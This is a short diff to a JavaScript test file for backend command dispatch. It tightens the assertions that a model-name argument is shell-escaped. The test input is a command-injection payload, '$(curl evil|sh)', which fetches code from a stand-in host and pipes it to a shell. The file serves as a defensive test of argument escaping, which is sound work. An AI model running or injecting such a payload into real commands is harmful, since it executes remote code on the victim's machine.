@@ -116,8 +116,8 @@ describe('runIteration (sync) backend dispatch', () => {
       model: '$(curl evil|sh)',
     });
     const firstArg = vi.mocked(spawnSync).mock.calls[0]?.[0];
-    expect(firstArg).toContain(' --model "$(curl evil|sh)"');
-    expect(firstArg).not.toMatch(/--model \$\(curl evil\|sh\)(?!")/);
+    expect(firstArg).toContain(' --model "\\$(curl evil|sh)"');
+    expect(firstArg).not.toMatch(/--model "?\$\(curl evil\|sh\)/);
   });
 
   it('passes -w worktree for cursor when configured', () => {
